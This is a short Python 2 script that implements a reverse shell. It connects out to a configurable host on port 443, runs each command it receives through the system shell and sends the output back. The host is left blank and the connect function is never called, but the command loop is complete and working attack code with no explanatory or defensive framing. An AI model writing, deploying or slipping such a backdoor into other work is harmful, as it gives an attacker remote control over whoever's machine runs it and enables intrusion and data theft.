import socket
import subprocess

host = ''
port = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect(host, port):
	callback_ip = host
	callback_port = port

	s.connect((host, port))

	while True:
		data = s.recv(1024)
		if data == "q": break
		print data
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdouts = proc.stdout.read() + proc.stderr.read()
		s.send(stdouts)
	s.close()